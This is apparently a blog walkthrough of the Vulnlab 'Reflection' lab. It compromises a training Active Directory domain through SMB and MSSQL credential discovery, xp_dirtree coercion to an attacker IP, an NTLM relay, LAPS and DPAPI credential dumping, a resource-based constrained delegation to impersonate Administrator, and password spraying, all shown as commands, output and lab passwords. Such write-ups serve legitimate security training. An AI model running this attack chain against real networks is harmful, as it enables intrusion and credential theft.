---
title: Vulnlab - Reflection
date: 2025-02-06 02:35:00 +/-TTTT
categories: [VulnLab]
tags: [ntlmrelay-attack, GenericAll, RBCD]     # TAG names should always be lowercase
image : /assets/images/reflection_slide.png
---

10.10.129.245
10.10.129.246
10.10.129.247

### MS01

- Look into Relaying Attacks
- Run Bloodhound & look into interestings ACLs

### WS01

- Another flavour of the same ACL
- Dump Credentials

### DC01

- A common human mistake

we can start with nxc for checking hostname

    ➜  Reflection nxc smb 10.10.129.245
    SMB         10.10.129.245   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
    ➜  Reflection nxc smb 10.10.129.246
    SMB         10.10.129.246   445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False)
    ➜  Reflection nxc smb 10.10.129.247
    ➜  Reflection 

i wanna also check nmap

    ➜  Reflection nmap -sC -sV -Pn -vv 10.10.129.246
    Discovered open port 135/tcp on 10.10.129.246
    Discovered open port 3389/tcp on 10.10.129.246
    Discovered open port 445/tcp on 10.10.129.246
    Discovered open port 1433/tcp on 10.10.129.246
    Discovered open port 5985/tcp on 10.10.129.246

there is mssql so its great to know

there is nothig interesting too much so lets go for smb enum

    ➜  Reflection nxc smb MS01 -u "guest" -p '' --shares
    SMB         10.10.129.246   445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False)
    SMB         10.10.129.246   445    MS01             [+] reflection.vl\guest: 
    SMB         10.10.129.246   445    MS01             [*] Enumerated shares
    SMB         10.10.129.246   445    MS01             Share           Permissions     Remark
    SMB         10.10.129.246   445    MS01             -----           -----------     ------
    SMB         10.10.129.246   445    MS01             ADMIN$                          Remote Admin
    SMB         10.10.129.246   445    MS01             C$                              Default share
    SMB         10.10.129.246   445    MS01             IPC$            READ            Remote IPC
    SMB         10.10.129.246   445    MS01             staging         READ            staging environment

grab file

    ➜  Reflection smbclient \\\\MS01\\staging
    Password for [WORKGROUP\root]:
    Try "help" to get a list of possible commands.
    smb: \> ls
    .                                   D        0  Wed Jun  7 13:42:48 2023
    ..                                  D        0  Wed Jun  7 13:41:25 2023
    staging_db.conf                     A       50  Thu Jun  8 07:21:49 2023

                    6261245 blocks of size 4096. 1178692 blocks available
    smb: \> get staging_db.conf 
    getting file \staging_db.conf of size 50 as staging_db.conf (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
    smb: \> exit

and got some creds

    ➜  Reflection cat staging_db.conf 
    user=web_staging
    password=Washroom510
    db=staging#    

but there is no more shares we can access again and check for other files

so lets try on MSSQL 

and its actually work

    ➜  Reflection nxc mssql MS01 -u "web_staging" -p 'Washroom510' --local-auth
    MSSQL       10.10.129.246   1433   MS01             [*] Windows Server 2022 Build 20348 (name:MS01) (domain:reflection.vl)
    MSSQL       10.10.129.246   1433   MS01             [+] MS01\web_staging:Washroom510 

alright we got mssql as Guest

    ➜  Reflection python3 /opt/impacket/examples/mssqlclient.py reflection.vl/web_staging:'Washroom510'@MS01              
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [*] Encryption required, switching to TLS
    [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
    [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
    [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
    [*] INFO(MS01\SQLEXPRESS): Line 1: Changed database context to 'master'.
    [*] INFO(MS01\SQLEXPRESS): Line 1: Changed language setting to us_english.
    [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
    [!] Press help for extra shell commands
    SQL (web_staging  guest@master)> 

i will try to read database tables first

    SQL (web_staging  guest@master)> SELECT name FROM master..sysdatabases;
    name      
    -------   
    master    

    tempdb    

    model     

    msdb      

    staging   

    SQL (web_staging  guest@master)> USE staging;
    ENVCHANGE(DATABASE): Old Value: master, New Value: staging
    INFO(MS01\SQLEXPRESS): Line 1: Changed database context to 'staging'.
    SQL (web_staging  dbo@staging)> SELECT name FROM sys.tables;
    name    
    -----   
    users   

    SQL (web_staging  dbo@staging)> SELECT * FROM users;
    id   username   password        
    --   --------   -------------   
    1   b'dev01'   b'Initial123'   

    2   b'dev02'   b'Initial123'   

    SQL (web_staging  dbo@staging)> 

and we got some creds lets use them for creds spray again

bad new its not working

![alt text](<../assets/images/Screenshot_2025-02-04_20_48_30.png>)

so lets try to get ntlm hash on responder

    SQL (web_staging  guest@master)> xp_dirtree \\10.8.2.152\share
    subdirectory   depth   file   
    ------------   -----   ----   
    SQL (web_staging  guest@master)> 


after that command its actually work

![alt text](<../assets/images/Screenshot_2025-02-04_20_49_49.png>)

but unf its not crackable

okey if we can get ntml hash then we can try here ntlm attack 😉

### ntlmrelay attack

first of all im gonna put it at hosts.txt our targets

lets start our ntlmrelay

    ➜  Reflection ntlmrelayx.py -smb2support -tf hosts.txt -i
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [*] Protocol Client SMB loaded..
    [*] Protocol Client RPC loaded..
    [*] Protocol Client SMTP loaded..
    [*] Protocol Client HTTPS loaded..
    [*] Protocol Client HTTP loaded..
    [*] Protocol Client IMAPS loaded..
    [*] Protocol Client IMAP loaded..
    [*] Protocol Client LDAPS loaded..
    [*] Protocol Client LDAP loaded..
    [*] Protocol Client DCSYNC loaded..
    [*] Protocol Client MSSQL loaded..
    [*] Running in relay mode to hosts in targetfile
    [*] Setting up SMB Server on port 445
    [*] Setting up HTTP Server on port 80
    [*] Setting up WCF Server on port 9389
    [*] Setting up RAW Server on port 6666
    [*] Multirelay enabled

and run at mssql

    ➜  Reflection python3 /opt/impacket/examples/mssqlclient.py reflection.vl/web_staging:'Washroom510'@MS01
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [*] Encryption required, switching to TLS
    [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
    [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
    [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
    [*] INFO(MS01\SQLEXPRESS): Line 1: Changed database context to 'master'.
    [*] INFO(MS01\SQLEXPRESS): Line 1: Changed language setting to us_english.
    [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
    [!] Press help for extra shell commands
    SQL (web_staging  guest@master)> xp_dirtree \\10.8.2.152\relay
    subdirectory   depth   file 

![alt text](<../assets/images/Screenshot_2025-02-04_21_01_04.png>)

[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000

and now we can access with nc

![alt text](<../assets/images/Screenshot_2025-02-04_21_02_31.png>)

and boom new creds

    ➜  Reflection cat prod_db.conf 
    user=web_prod
    password=Tribesman201
    db=prod# 

and get mssql creds at DC

    ➜  Reflection nxc mssql hosts.txt -u "web_prod" -p "Tribesman201" --local-auth 
    MSSQL       10.10.129.245   1433   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:reflection.vl)
    MSSQL       10.10.129.246   1433   MS01             [*] Windows Server 2022 Build 20348 (name:MS01) (domain:reflection.vl)
    MSSQL       10.10.129.245   1433   DC01             [+] DC01\web_prod:Tribesman201 
    MSSQL       10.10.129.246   1433   MS01             [-] MS01\web_prod:Tribesman201 (Login failed for user 'web_prod'. Please try again with or without '--local-auth')

again we got access as Guest but its another mssql server

    ➜  Reflection python3 /opt/impacket/examples/mssqlclient.py reflection.vl/web_prod:'Tribesman201'@DC01
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [*] Encryption required, switching to TLS
    [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
    [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
    [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
    [*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
    [*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
    [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
    [!] Press help for extra shell commands
    SQL (web_prod  guest@master)> 

![alt text](<../assets/images/Screenshot_2025-02-04_21_06_49.png>)

    1   b'abbie.smith'    b'CMe1x+nlRaaWEw'   

    2   b'dorothy.rose'   b'hC_fny3OK9glSJ'
now we can dump bloodhound data 😉

#### bloodhound data

    ➜  Reflection nxc ldap DC01.reflection.vl -u "abbie.smith" -p "CMe1x+nlRaaWEw" --bloodhound --dns-server 10.10.129.245 --collection All
    SMB         10.10.129.245   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
    LDAP        10.10.129.245   389    DC01             [+] reflection.vl\abbie.smith:CMe1x+nlRaaWEw 
    LDAP        10.10.129.245   389    DC01             Resolved collection methods: localadmin, container, trusts, psremote, session, rdp, dcom, objectprops, group, acl
    LDAP        10.10.129.245   389    DC01             Done in 00M 17S
    LDAP        10.10.129.245   389    DC01             Compressing output into /root/.nxc/logs/DC01_10.10.129.245_2025-02-04_211112_bloodhound.zip

### GenericAll

![alt text](<../assets/images/1 (7).png>)

while we have GenericlAll for machine then we can use —laps for grab administrator password

    ➜  Reflection nxc ldap DC01.reflection.vl -u 'abbie.smith' -p 'CMe1x+nlRaaWEw' -M laps
    SMB         10.10.129.245   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
    LDAP        10.10.129.245   389    DC01             [+] reflection.vl\abbie.smith:CMe1x+nlRaaWEw 
    LAPS        10.10.129.245   389    DC01             [*] Getting LAPS Passwords
    LAPS        10.10.129.245   389    DC01             Computer:MS01$ User:                Password:H447.++h6g5}xi


BOOOM lets load beacon at MS01

![alt text](<../assets/images/Screenshot_2025-02-04_21_26_15.png>)

lets dump dpapi

we got Georgia.Price creds

![alt text](<../assets/images/Screenshot_2025-02-04_21_33_10.png>)

    ➜  Reflection nxc smb MS01.reflection.vl -u Administrator -p 'H447.++h6g5}xi' --dpapi --local-auth     
    SMB         10.10.129.246   445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
    SMB         10.10.129.246   445    MS01             [+] MS01\Administrator:H447.++h6g5}xi (Pwn3d!)
    SMB         10.10.129.246   445    MS01             [*] Collecting User and Machine masterkeys, grab a coffee and be patient...
    SMB         10.10.129.246   445    MS01             [+] Got 7 decrypted masterkeys. Looting secrets...
    SMB         10.10.129.246   445    MS01             [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{013CD3ED-72CB-4801-99D7-8E7CA1F7E370} - REFLECTION\Georgia.Price:DBl+5MPkpJg5id

we have again same thing for next target

![alt text](<../assets/images/Screenshot_2025-02-04_21_34_10.png>)

lets do again —laps

but laps is not configured so lets use RBDC which is always work

    ➜  Reflection nxc ldap DC01.reflection.vl -u 'Georgia.Price' -p 'DBl+5MPkpJg5id' -M laps
    SMB         10.10.129.245   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
    LDAP        10.10.129.245   389    DC01             [+] reflection.vl\Georgia.Price:DBl+5MPkpJg5id 
    LAPS        10.10.129.245   389    DC01             [*] Getting LAPS Passwords
    LAPS        10.10.129.245   389    DC01             [-] No result found with attribute ms-MCS-AdmPwd or msLAPS-Password !

### RBCD

    ➜  Reflection python3 /opt/impacket/examples/rbcd.py -action write -delegate-to "WS01$" -delegate-from "MS01$" -dc-ip 10.10.129.245 "Reflection/Georgia.Price:DBl+5MPkpJg5id"
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
    [*] Delegation rights modified successfully!
    [*] MS01$ can now impersonate users on WS01$ via S4U2Proxy
    [*] Accounts allowed to act on behalf of other identity:
    [*]     MS01$        (S-1-5-21-3375389138-1770791787-1490854311-1104)

getST

    ➜  Reflection python3 /opt/impacket/examples/getST.py -spn 'cifs/WS01.reflection.vl' -impersonate Administrator -dc-ip 10.10.129.245 'Reflection/MS01$' -hashes ':520bd3d66bdc0102e950f13e0b164073'
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [-] CCache file is not found. Skipping...
    [*] Getting TGT for user
    [*] Impersonating Administrator
    [*] Requesting S4U2self
    [*] Requesting S4U2Proxy
    [*] Saving ticket in Administrator@cifs_WS01.reflection.vl@REFLECTION.VL.ccache

![alt text](<../assets/images/Screenshot_2025-02-04_21_44_03.png>)

[*] DefaultPassword 
reflection.vl\Rhys.Garner:knh1gJ8Xmeq+uP

we got password so lets do passwords spray with full user

full users list

    ➜  bloodhound cat DC01_10.10.129.245_2025-02-04_211112_users.json | jq -r '.data[].Properties.samaccountname' > full_users

    ➜  bloodhound cat full_users 
    null
    dom_rgarner
    svc_web_prod
    svc_web_staging
    Deborah.Collins
    Dorothy.Rose
    Jeremy.Marshall
    Rhys.Garner
    Dylan.Marsh
    Abbie.Smith
    Bethany.Wright
    Craig.Williams
    labadm
    Michael.Wilkinson
    krbtgt
    Georgia.Price
    Guest
    Administrator

and booomm

![alt text](<../assets/images/Screenshot_2025-02-04_21_46_39.png>)

